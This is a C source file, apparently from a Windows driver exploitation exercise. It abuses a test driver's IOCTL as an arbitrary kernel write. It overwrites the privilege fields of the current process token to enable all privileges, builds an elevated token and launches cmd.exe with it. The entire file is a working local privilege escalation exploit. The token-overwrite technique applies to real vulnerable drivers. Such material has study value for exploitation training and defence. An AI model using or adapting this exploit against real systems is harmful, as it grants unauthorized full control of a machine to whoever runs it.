#include "util.h"
#include "03_driver_analysis\TestDriver\TestDriver\drv_ioctl.h"

HANDLE hDevice = NULL;

VOID write(PULONG64 address, ULONG64 value)
{
    CALC_STRUCT calc;
    BOOL isSuccess;
    ULONG returned;

    if (hDevice == NULL)
    {
        hDevice = CreateFile(
            L"\\\\.\\TestDriver",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

        if (hDevice == INVALID_HANDLE_VALUE)
        {
            printf("Error while CreateFile : %d\n", GetLastError());
            return;
        }
    }

    calc.a = value;
    calc.b = 0;

    isSuccess = DeviceIoControl(
        hDevice,          // HANDLE       hDevice
        (DWORD)IOCTL_SUM, // DWORD        dwIoControlCode
        &calc,            // LPVOID       lpInBuffer
        sizeof(calc),     // DWORD        nInBufferSize
        address,          // LPVOID       lpOutBuffer
        sizeof(address),  // DWORD        nOutBufferSize
        &returned,        // LPDWORD      lpBytesReturned
        NULL              // LPOVERLAPPED lpOverlapped
    );
    if (!isSuccess)
    {
        printf("Error while DeviceIoControl : %d\n", GetLastError());
        return;
    }
}

VOID main()
{
    int dbg;
    STARTUPINFO si = {
        0,
    };
    PROCESS_INFORMATION pi = {
        0,
    };
    HANDLE hTokenCurrent;
    ULONG64 hTokenCurrentAddress;
    HANDLE hTokenElevate;

    hTokenCurrentAddress = get_process_token();

    write(hTokenCurrentAddress + (ULONG64)0x40, (ULONG64)-1);
    write(hTokenCurrentAddress + (ULONG64)0x48, (ULONG64)-1);
    write(hTokenCurrentAddress + (ULONG64)0x50, (ULONG64)-1);

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hTokenCurrent))
    {
        printf("error while OpenProcessToken: %d\n", GetLastError());
        return;
    }
    hTokenElevate = CreateUserToken(hTokenCurrent, 2);
    printf("Elevated: %llx\n", get_handle_addr(hTokenElevate));

    if (!CreateProcessWithTokenW(hTokenElevate, 1, L"cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("Error while CreateProcess : %d\n", GetLastError());
        return;
    }
}